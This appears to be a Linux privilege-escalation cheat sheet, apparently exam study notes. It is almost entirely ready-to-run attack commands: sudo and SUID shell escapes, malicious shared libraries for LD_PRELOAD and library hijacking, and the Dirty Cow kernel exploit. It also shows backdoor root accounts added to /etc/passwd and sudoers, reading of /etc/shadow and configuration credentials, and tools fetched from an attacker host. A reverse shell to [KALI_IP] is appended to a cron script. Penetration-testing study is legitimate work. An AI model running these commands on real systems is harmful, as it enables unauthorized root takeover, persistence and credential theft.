## 🗺️ PRIVESC FLOW

```
Shell → id + sudo -l → linPEAS → SUID scan → Cron → Writable files → Kernel → Root
```

---

## 1️⃣ FIRST COMMANDS — Always Run These ⭐

```bash
id
whoami
hostname
uname -a
uname -r                                    # kernel version
cat /etc/os-release
cat /proc/version
cat /etc/issue

# Users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"  # login-capable users
cat /etc/shadow                              # hashes (needs root)
cat /etc/group
cat /etc/sudoers 2>/dev/null

# Critical — run immediately
sudo -l                                      # ⭐ most important

# Environment
env
echo $PATH
history
cat ~/.bash_history
cat ~/.bashrc

# Network
ip a
ss -tulnp
netstat -tulnp
cat /etc/hosts
```

---

## 2️⃣ AUTOMATED ENUMERATION ⭐⭐⭐

### linPEAS — Heavy Hitter ⭐⭐⭐

```bash
# Download + run in memory (no disk write)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Upload + run
# Kali:
python3 -m http.server 80
# Target:
wget http://[KALI_IP]/linpeas.sh -O /tmp/lpe.sh
curl http://[KALI_IP]/linpeas.sh -o /tmp/lpe.sh
chmod +x /tmp/lpe.sh && /tmp/lpe.sh
/tmp/lpe.sh 2>/dev/null | tee /tmp/lpe_out.txt

# Via meterpreter
upload /opt/linpeas.sh /tmp/lpe.sh
shell
chmod +x /tmp/lpe.sh && /tmp/lpe.sh
```

### linux-exploit-suggester ⭐⭐

```bash
# Upload + run
wget http://[KALI_IP]/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh && /tmp/les.sh

# More focused kernel version check
/tmp/les.sh --kernel $(uname -r)

# les2 (newer version)
wget http://[KALI_IP]/les2.pl -O /tmp/les2.pl
perl /tmp/les2.pl
```

### MSF — linux suggester

```bash
# From meterpreter session
run post/multi/recon/local_exploit_suggester
run post/linux/gather/enum_configs
run post/linux/gather/hashdump
```

---

## 3️⃣ SUDO MISCONFIGURATIONS ⭐⭐⭐

### Enumerate

```bash
sudo -l
sudo -l -U [USER]
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
```

### NOPASSWD — Direct Shell ⭐

```bash
# If output shows: (ALL) NOPASSWD: ALL
sudo /bin/bash
sudo su -
sudo /bin/sh

# If specific binary allowed — go to GTFOBins
# (ALL) NOPASSWD: /usr/bin/vim
sudo /usr/bin/vim -c ':!/bin/bash'
sudo /usr/bin/vim -c ':set shell=/bin/bash:shell'

# (ALL) NOPASSWD: /usr/bin/find
sudo /usr/bin/find . -exec /bin/bash \; -quit

# (ALL) NOPASSWD: /usr/bin/less
sudo /usr/bin/less /etc/passwd
# Inside less: !bash

# (ALL) NOPASSWD: /usr/bin/man
sudo /usr/bin/man man
# Inside man: !bash

# (ALL) NOPASSWD: /usr/bin/awk
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'

# (ALL) NOPASSWD: /usr/bin/python*
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo python -c 'import os; os.system("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash";'

# (ALL) NOPASSWD: /usr/bin/ruby
sudo ruby -e 'exec "/bin/bash"'

# (ALL) NOPASSWD: /usr/bin/lua
sudo lua -e 'os.execute("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/nmap  (older nmap)
sudo nmap --interactive
# Inside nmap: !sh

# (ALL) NOPASSWD: /usr/bin/nmap  (new nmap)
echo "os.execute('/bin/bash')" > /tmp/nmap.nse
sudo nmap --script=/tmp/nmap.nse

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# (ALL) NOPASSWD: /usr/bin/tee
echo "[USER] ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers

# (ALL) NOPASSWD: /usr/bin/cp
sudo cp /bin/bash /tmp/rootbash
sudo chmod +s /tmp/rootbash
/tmp/rootbash -p

# (ALL) NOPASSWD: /bin/nano / /bin/vi
sudo nano                          # Ctrl+R Ctrl+X → then: reset; bash 1>&0 2>&0
sudo vi -c ':!/bin/bash'

# (ALL) NOPASSWD: /usr/bin/wget
sudo wget http://[KALI_IP]/passwd -O /etc/passwd     # overwrite with root user added

# (ALL) NOPASSWD: /usr/bin/curl
sudo curl file:///etc/shadow
sudo curl http://[KALI_IP]/passwd -o /etc/passwd
```

### Sudo with Wildcard / Args Bypass

```bash
# (ALL) NOPASSWD: /usr/bin/git
sudo git help config
# In pager: !/bin/bash

# (ALL) NOPASSWD: /usr/bin/zip
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'bash #'
rm -f $TF

# (ALL) NOPASSWD: /usr/bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# (ALL) NOPASSWD: /usr/bin/ftp
sudo ftp
# Inside: !/bin/bash

# LD_PRELOAD sudo bypass (if env_keep += LD_PRELOAD in sudoers)
# Kali — create malicious .so:
cat > /tmp/pe.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
# Target:
sudo LD_PRELOAD=/tmp/pe.so [ANY_ALLOWED_CMD]
```

---

## 4️⃣ SUID / SGID ABUSE ⭐⭐⭐

### Enumerate

```bash
# SUID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# SGID
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la 2>/dev/null
```

### GTFOBins — SUID Exploits ⭐

```bash
# bash (SUID)
/bin/bash -p

# find (SUID)
/usr/bin/find . -exec /bin/sh -p \; -quit

# vim / vi (SUID)
/usr/bin/vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
/usr/bin/vim.basic -c ':!/bin/bash -p'

# python (SUID)
/usr/bin/python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
/usr/bin/python -c 'import os; os.execl("/bin/sh","sh","-p")'

# nmap (SUID — old)
/usr/bin/nmap --interactive
# Inside: !sh -p

# less (SUID)
/usr/bin/less /etc/passwd
# Inside: !/bin/sh -p

# nano (SUID)
/usr/bin/nano
# Ctrl+R → Ctrl+X → reset; bash 1>&0 2>&0

# awk (SUID)
/usr/bin/awk 'BEGIN {system("/bin/sh -p")}'

# perl (SUID)
/usr/bin/perl -e 'exec "/bin/sh -p"'

# ruby (SUID)
/usr/bin/ruby -e 'exec "/bin/sh -p"'

# cp (SUID) — overwrite /etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2       # pass: root

# env (SUID)
/usr/bin/env /bin/sh -p

# tee (SUID) — write to root-owned files
echo "[USER] ALL=(ALL) NOPASSWD:ALL" | /usr/bin/tee -a /etc/sudoers

# date (SUID) — read root files
/bin/date -f /etc/shadow

# taskset (SUID)
/usr/bin/taskset 1 /bin/sh -p

# strace (SUID)
/usr/bin/strace -o /dev/null /bin/sh -p

# Custom SUID binary — check with strings
strings /usr/local/bin/[SUID_BINARY] | grep -i "system\|exec\|/bin"
ltrace /usr/local/bin/[SUID_BINARY]
```

### Shared Object Hijack (Custom SUID)

```bash
# Check missing .so files
strace /usr/local/bin/[SUID_BINARY] 2>&1 | grep "No such file"
# Output: open("/tmp/libfoo.so", ...) = -1 ENOENT

# Create malicious .so
cat > /tmp/libfoo.c << EOF
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libfoo.so /tmp/libfoo.c
# Run target binary again → shell as root
/usr/local/bin/[SUID_BINARY]
```

---

## 5️⃣ CRON JOB ABUSE ⭐⭐

### Enumerate

```bash
cat /etc/crontab
ls -la /etc/cron*
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
crontab -l
crontab -l -u [USER]
cat /var/spool/cron/crontabs/* 2>/dev/null

# Live monitoring (watch for new processes)
ps aux --sort=-pid | head -20
watch -n 1 "ps aux | grep root"

# pspy — monitor processes without root ⭐
wget http://[KALI_IP]/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy && /tmp/pspy
```

### Writable Cron Script

```bash
# If cron runs /opt/script.sh as root and it's writable:
ls -la /opt/script.sh
echo "chmod +s /bin/bash" >> /opt/script.sh
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /opt/script.sh
echo "bash -i >& /dev/tcp/[KALI_IP]/4444 0>&1" >> /opt/script.sh

# Wait for cron to fire then:
/bin/bash -p
/tmp/rootbash -p
```

### Cron PATH Hijack

```bash
# /etc/crontab has PATH=/home/user:/usr/local/sbin:...
# and runs: * * * * * root backup.sh (no full path)

# Create malicious backup.sh in writable PATH dir
echo '#!/bin/bash' > /home/[USER]/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/[USER]/backup.sh
chmod +x /home/[USER]/backup.sh

# Wait for cron → execute:
/tmp/rootbash -p
```

### Cron Wildcard Injection (tar/rsync)

```bash
# Cron runs: cd /var/www && tar -czf /tmp/backup.tgz *
# OR: rsync -a * user@[TARGET_IP]:/backup/

# Create exploit files in that directory:
echo "" > /var/www/'--checkpoint=1'
echo "" > /var/www/'--checkpoint-action=exec=bash shell.sh'
cat > /var/www/shell.sh << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /var/www/shell.sh

# Wait for cron → run:
/tmp/rootbash -p
```

---

## 6️⃣ WRITABLE /etc/passwd ⭐⭐

```bash
# Check if writable
ls -la /etc/passwd
ls -la /etc/passwd | grep -v "r--r--r--"

# Generate password hash
openssl passwd -1 -salt root rootpass     # md5crypt → $1$root$...
openssl passwd rootpass                    # simple hash
python3 -c "import crypt; print(crypt.crypt('rootpass', '\$1\$root\$'))"

# Append new root user
echo 'root2:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash' >> /etc/passwd
# Password = rootpass
su root2

# Alternative — blank password root clone
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                                  # no password needed

# If /etc/shadow writable too
python3 -c "import crypt; print(crypt.crypt('newpass', crypt.mksalt(crypt.METHOD_SHA512)))"
# Replace current root hash in /etc/shadow
```

---

## 7️⃣ PATH HIJACK ⭐

### Enumerate

```bash
echo $PATH
# Look for writable dirs that appear BEFORE /usr/bin etc.
ls -la /tmp
ls -la /home/[USER]

# Find SUID binaries calling commands without full path
strings /usr/local/bin/[SUID_BINARY] | grep -v "/"   # relative commands
ltrace /usr/local/bin/[SUID_BINARY] 2>&1 | head -30
strace /usr/local/bin/[SUID_BINARY] 2>&1 | grep exec
```

### Exploit

```bash
# If SUID binary calls "service" or "ps" etc. without full path:
cd /tmp
echo '#!/bin/bash' > service
echo '/bin/bash -p' >> service
chmod +x service
export PATH=/tmp:$PATH

# Now run SUID binary — it executes /tmp/service instead of /usr/sbin/service
/usr/local/bin/[SUID_BINARY]
```

---

## 8️⃣ LINUX CAPABILITIES ⭐

### Enumerate

```bash
getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
```

### Exploit Common Capabilities

```bash
# cap_setuid+ep on python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid+ep on perl
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_net_raw on tcpdump (sniff creds)
/usr/sbin/tcpdump -i eth0 -w /tmp/cap.pcap

# cap_dac_read_search (read any file)
/usr/bin/tar -cvf /tmp/shadow.tar /etc/shadow
# OR use the binary to read directly

# cap_setuid on vim
/usr/bin/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-c","bash")'
```

---

## 9️⃣ KERNEL EXPLOITS ⭐⭐

### Find Kernel Version

```bash
uname -r
uname -a
cat /proc/version
```

### linux-exploit-suggester Output → Key Kernels

```bash
# Run suggester first:
/tmp/les.sh
/tmp/les.sh --kernel $(uname -r)

# Cross-reference searchsploit (Kali):
searchsploit linux kernel $(uname -r | cut -d. -f1-2)
searchsploit linux privilege escalation kernel
```

### Dirty Cow (CVE-2016-5195) — Kernel < 4.8.3

```bash
# Check kernel
uname -r                  # vulnerable: < 4.8.3

# Download on Kali, compile on target (if gcc available):
searchsploit -m 40611     # dirty cow - PTRACE_POKEDATA
searchsploit -m 40839     # dirty cow - /etc/passwd write

# Upload + compile on target
gcc -pthread 40839.c -o dirtycow -lcrypt
./dirtycow /etc/passwd 'firefart:r9Gym9/LXtJDs:0:0:root:/root:/bin/bash'
# firefart:r9Gym9/LXtJDs → password: r00t
su firefart

# Restore (after exam):
mv /tmp/passwd.bak /etc/passwd
```

### Overlayfs (CVE-2015-1328) — Ubuntu 12.04/14.04/15.10

```bash
searchsploit -m 37292
gcc 37292.c -o ofs
./ofs
```

### MSF Kernel Exploits

```bash
# From meterpreter — let suggester find the path
run post/multi/recon/local_exploit_suggester

# Use suggested module:
background
use [SUGGESTED_MODULE]
set SESSION [SESSION_ID]
run
```

---

## 🔟 NFS / MISC QUICK WINS ⭐

```bash
# NFS no_root_squash check
cat /etc/exports
showmount -e [TARGET_IP]          # from Kali — list NFS shares

# Mount + exploit (Kali — needs root)
mkdir /tmp/nfsmount
mount -t nfs [TARGET_IP]:/[SHARE] /tmp/nfsmount
# Copy bash, set SUID
cp /bin/bash /tmp/nfsmount/rootbash
chmod +s /tmp/nfsmount/rootbash
# On target:
/[SHARE]/rootbash -p

# Writable /etc/sudoers
echo "[USER] ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
sudo /bin/bash

# World-writable directories
find / -writable -type d 2>/dev/null | grep -v proc
find / -writable -type f 2>/dev/null | grep -E "cron|sudoers|passwd|shadow"

# Check for plaintext creds in configs
grep -r "password" /etc/ 2>/dev/null | grep -v Binary
grep -r "password" /var/www/ 2>/dev/null | grep -v Binary
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
```

---

## ⚡ QUICK REFERENCE — Vector → Command

|Finding|Exploit|
|---|---|
|`sudo -l` → NOPASSWD binary|GTFOBins → `sudo [bin] [escape]`|
|`sudo -l` → LD_PRELOAD kept|compile pe.so → `sudo LD_PRELOAD=...`|
|SUID on bash|`/bin/bash -p`|
|SUID on find|`find . -exec /bin/sh -p \; -quit`|
|SUID on vim|`vim -c ':!/bin/bash -p'`|
|SUID on python|`python -c 'import os; os.execl("/bin/sh","sh","-p")'`|
|Custom SUID + relative cmd|PATH hijack → malicious binary in /tmp|
|Custom SUID + missing .so|compile malicious .so → place in search path|
|Writable cron script|append rev shell → wait|
|Cron wildcard (tar)|`--checkpoint-action=exec=` trick|
|Cron PATH hijack|malicious script in writable PATH dir|
|Writable /etc/passwd|append `hacker::0:0:root:/root:/bin/bash`|
|cap_setuid on python|`os.setuid(0); os.system("/bin/bash")`|
|Kernel < 4.8.3|Dirty Cow (CVE-2016-5195)|
|NFS no_root_squash|mount → SUID bash → run on target|

---

## 🧠 EXAM DECISION TREE

```
Linux shell obtained?
│
├── Step 1: sudo -l
│   ├── NOPASSWD: ALL → sudo bash → done
│   └── NOPASSWD: [binary] → GTFOBins → done
│
├── Step 2: find SUID binaries
│   find / -perm -4000 -type f 2>/dev/null
│   └── Match to GTFOBins → exploit
│
├── Step 3: run linPEAS + pspy
│   ├── Cron writable script → append rev shell
│   ├── Cron PATH hijack → drop script → wait
│   ├── Writable /etc/passwd → add root user
│   └── Capabilities (getcap) → python/perl setuid
│
├── Step 4: linux-exploit-suggester
│   uname -r → les.sh → kernel exploit
│   └── Dirty Cow if kernel < 4.8.3
│
├── Step 5: PATH hijack
│   strings [SUID_BIN] → relative command?
│   └── drop malicious binary in /tmp → export PATH
│
└── Step 6: Check configs + NFS
    ├── grep -r password /var/www/ /etc/
    ├── cat /etc/exports → no_root_squash?
    └── Find plaintext creds → su / sudo
```

---
---
